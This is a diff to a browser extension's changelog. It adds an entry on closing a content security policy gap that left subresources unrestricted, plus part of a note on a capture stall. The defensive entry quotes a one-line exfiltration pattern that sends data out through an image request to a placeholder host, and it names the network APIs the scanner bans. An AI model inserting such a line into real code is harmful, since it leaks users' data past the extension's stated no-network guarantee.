@@ -13,6 +13,22 @@ a clean checkout with `./tools/pack.sh`, not merely checkable against one downlo
 Everything below is on `main` and not yet packaged. It covers the toolbar rework
 and the capture reliability work of 2026-09-08 and 2026-09-09.
 
+### Fixed: the content security policy left every subresource unrestricted
+`connect-src 'none'` blocks `fetch`, `XMLHttpRequest`, WebSocket and
+`sendBeacon`, and the scanner banned all four by name. It does nothing about a
+subresource. In CSP a directive that is absent, with no `default-src` to fall
+back on, is unrestricted, and the policy named none, so `img-src`, `style-src`,
+`font-src` and `media-src` were open and
+`new Image().src = 'https://host/?d=' + data` was a way out that neither the
+policy nor the scanner stopped.
+
+The policy now names every directive, `base-uri` and `form-action` included.
+Two scanner rules catch the assignment as well as the policy, so a remote `src`,
+`srcset` or CSS `url()` fails the suite, and an invariant test asserts each
+directive is present so a later edit cannot quietly drop one. The README's claim
+that the extension has no network access is enforced rather than described. See
+[docs/DECISIONS.md](docs/DECISIONS.md) D15.
+
 ### Fixed: a capture could reach 100% and never open
 On pages whose scripts never go quiet, the walk finished with every screenful in
 hand and then wedged: the toolbar icon read 100%, the panel read "Screen 11 of
